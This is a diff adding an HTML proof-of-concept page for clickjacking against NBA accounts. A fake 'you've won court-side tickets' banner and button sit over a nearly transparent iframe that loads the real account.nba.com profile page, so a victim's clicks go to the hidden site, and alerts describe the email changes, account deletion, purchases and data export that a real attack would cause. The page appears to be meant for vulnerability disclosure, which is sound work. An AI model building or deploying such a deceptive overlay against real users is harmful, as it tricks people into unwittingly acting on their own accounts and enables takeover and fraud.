@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NBA Account Takeover - Clickjacking PoC</title>
+    <style>
+        /* Malicious overlay */
+        .fake-button {
+            position: absolute;
+            top: 520px; 
+            left: 850px;
+            z-index: 100;
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
+            color: white;
+            padding: 20px 40px;
+            border: none;
+            border-radius: 10px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(255, 0, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+        .fake-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 35px rgba(255, 0, 0, 0.4);
+        }
+        
+        /* Hidden iframe */
+        iframe {
+            position: absolute;
+            top: -420px;
+            left: -180px;
+            width: 1600px;
+            height: 1600px;
+            opacity: 0.001;
+            z-index: 1;
+            border: none;
+        }
+        
+        /* Fake content */
+        .banner {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <div class="banner">
+        <h1>🎉 CONGRATULATIONS NBA FAN! 🎉</h1>
+        <h2>You've won 2 COURT-SIDE TICKETS to the NBA Finals!</h2>
+        <p>Click the button below to claim your prize instantly!</p>
+    </div>
+
+    <button class="fake-button" onclick="alert('Account takeover would occur here')">
+        🔥 CLAIM YOUR TICKETS NOW! 🔥
+    </button>
+
+    <!-- This loads the REAL NBA account page -->
+    <iframe src="https://account.nba.com/profile" sandbox="allow-forms allow-scripts"></iframe>
+
+    <script>
+        // Simulate successful attack
+        document.querySelector('.fake-button').addEventListener('click', function() {
+            this.innerHTML = "🎟️ TICKETS CLAIMED! 🎟️";
+            this.style.background = "linear-gradient(45deg, #00b09b, #96c93d)";
+            this.style.boxShadow = "0 8px 25px rgba(0, 180, 155, 0.3)";
+            
+            // In real attack, this would trigger hidden iframe form submission
+            setTimeout(() => {
+                alert("In a real attack, this would have:\n1. Changed your email address\n2. Deleted your account\n3. Purchased expensive tickets\n4. Exported your personal data");
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
